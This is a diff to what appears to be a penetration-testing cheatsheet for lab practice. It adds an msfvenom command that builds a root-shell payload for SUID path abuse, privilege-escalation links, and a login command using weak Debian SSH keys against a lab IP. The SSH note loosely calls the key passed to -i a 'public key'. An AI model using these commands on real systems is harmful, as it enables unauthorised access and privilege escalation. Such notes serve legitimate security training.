@@ -1258,6 +1258,10 @@ Create specific payloads for reverse shell!
 
 You need a staged payload to connect to `nc`.
 
+Can also create payloads that execute a root shell (for SUID binaries relative path vulnerability):
+`msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o <command in SUID strings>`
+(https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst)
+
 #### LFI to RCE
 For the following examples I will be using this payload to execute system commands:
 ```
@@ -2074,6 +2078,7 @@ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 If this setting is enabled, we could craft an MSI file and run it to elevate our privileges.
 
 **Linux**
+https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 - Use `id` to gather user context information (e.g. what groups they are a part of)
 - `cat /etc/passwd` to enumerate users
@@ -2753,6 +2758,17 @@ Do TFTP traversal to access files.
 ----
 Powershell on Linux:
 https://www.linuxfordevices.com/tutorials/linux/install-run-powershell-on-linux
+
+----
+SSH `authorized_keys`
+If you have obtained `authorized_keys`, you may use the following to obtain the public key associated to it:
+https://gitbook.brainyou.stream/basic-linux/ssh-key-predictable-prng-authorized_keys-process
+Caveat: Only affects SSH keys generated on Debian-based systems between September 2006 and May 2008 (https://github.com/g0tmi1k/debian-ssh)
+Login with `ssh -i <public key (without .pub extension)> -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss bob@10.11.1.136`
+
+`authorized_keys` resides on the server, and authenticates with the user's public key to authenticate the user
+`known_hosts` resides on the client, and authenticates with the server's private key to authenticate the server
+https://security.stackexchange.com/questions/20706/what-is-the-difference-between-authorized-keys-and-known-hosts-file-for-ssh	
 
 ### Scripts
 Shellshock
